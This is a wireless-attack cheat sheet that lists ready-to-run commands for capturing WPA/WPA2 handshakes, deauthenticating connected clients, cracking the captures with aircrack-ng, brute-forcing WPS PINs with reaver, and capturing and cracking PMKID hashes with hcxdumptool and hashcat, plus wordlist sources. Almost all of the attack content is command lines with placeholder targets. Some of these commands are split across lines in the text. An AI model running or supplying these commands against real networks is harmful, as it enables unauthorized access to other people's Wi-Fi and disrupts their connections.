# Wireless Cracking

Wireless cracking is a critical aspect of cybersecurity, focusing on the identification and exploitation of vulnerabilities within wireless networks. Below, we present an extensive guide on various wireless cracking techniques, including WPA/WPA2 handshake cracking, WPS PIN cracking, PMKID attack, and essential wordlists for dictionary attacks.

### Checking Packet Injection Support

***

Before diving into wireless cracking, ensure your wireless interface supports packet injection using the following command.

```bash
aireplay-ng --test wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

### WPA/WPA2 Handshake Cracking

***

C**apture a WPA/WPA2 4-way Handshake.** Begin by monitoring a target WiFi network to capture the WPA/WPA2 4-way handshake.

```bash
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

**Deauthenticate Clients.** Optionally, you can deauthenticate clients from the WiFi network to disrupt their connections.

```bash
aireplay-ng --deauth 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

**Dictionary Attack against WPA/WPA2 Handshake**

Initiate a dictionary attack against the captured WPA/WPA2 handshake using 'aircrack-ng'

```bash
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF -w rockyou.txt airodump_essid_results*.cap
```

### WPS PIN Cracking

***

**Crack a WPS PIN.** Use 'reaver' to crack a WPS PIN:

```bash
reaver -vv --pixie-dust -i wlan1 -c 8 -e essid -b FF:FF:FF:FF:FF:FF
```

**Crack a WPS PIN with Delay Between Attempts.** Alternatively, crack a WPS PIN with specified delays between attempts.

```bash
reaver -vv --pixie-dust -N -L -d 5 -r 3:15 -T 0.5 -i wlan1 -c 8 -e essid -b FF:FF:FF:FF:FF:FF
```

### PMKID Attack

***

The PMKID attack allows you to crack WPA/WPA2 authentication without deauthenticating clients.

**1Install Required Tools on Kali Linux:**

```bash
apt-get update && apt-get -y install hcxtools
```

**Install Required Tool on WiFi Pineapple Mark VII.** If using a WiFi Pineapple Mark VII, install the tool:

```bash
opkg update && opkg install hcxdumptool
```

**Install Required Tool on WiFi Pineapple Nano.** On a WiFi Pineapple Nano, use.

```bash
opkg update && opkg -d sd install hcxdumptool
```

**Capture PMKID Hashes for Nearby Networks.** Start capturing PMKID hashes for all nearby networks

```bash
hcxdumptool --enable_status=1 -o
hcxdumptool_results.cap -i wlan0mon
```

Capture PMKID Hashes for Specific Networks. To capture PMKID hashes for specified WiFi networks, create a filter list and use

```bash
echo HH:HH:HH:HH:HH:HH | sed 's/\\\\://g' >> filter.txt 
hcxdumptool --enable_status=1 -o 
hcxdumptool_results.cap -i wlan0mon --filterlist_ap=filter.txt --filtermode=2
```

**Extract PMKID Hashes from PCAP File.** Extract PMKID hashes from the captured PCAP file

```bash
hcxpcaptool hcxdumptool_results.cap -k hashes.txt
```

**Dictionary Attack against PMKID Hashes.** Finally, launch a dictionary attack against the PMKID hashes using 'hashcat':

```bash
hashcat -m 16800 -a 0 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt rockyou.txt
```

### Useful Wordlists

***

Here are some valuable wordlists you can use during wireless cracking:

**Rockyou**

* The 'rockyou.txt' wordlist is commonly used and can be found at: `/usr/share/wordlists/`

**Seclists:**

* Download the 'seclists' collection, which contains various lists for security assessments, or manually retrieve it from GitHub

```bash
apt-get update && apt-get install seclists
ls -l /usr/share/seclists/
```
